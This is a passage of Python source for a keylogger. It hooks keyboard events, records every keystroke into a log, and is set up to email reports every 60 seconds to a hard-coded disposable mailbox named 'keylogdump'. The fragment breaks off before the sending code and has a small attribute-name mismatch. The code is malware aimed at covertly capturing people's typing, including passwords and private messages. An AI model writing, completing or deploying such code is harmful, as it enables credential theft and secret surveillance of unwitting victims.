import keyboard
import smtplib

from threading import Event, Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "keylogdump@yopmail.com"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        #record start & end datetimes
        self.start_ft = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This is used whenever a keyboard event occurs
        """
        name = event.name
        if len(name) > 1:
            #not a character, special key, uppercase wiht[]
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":","")

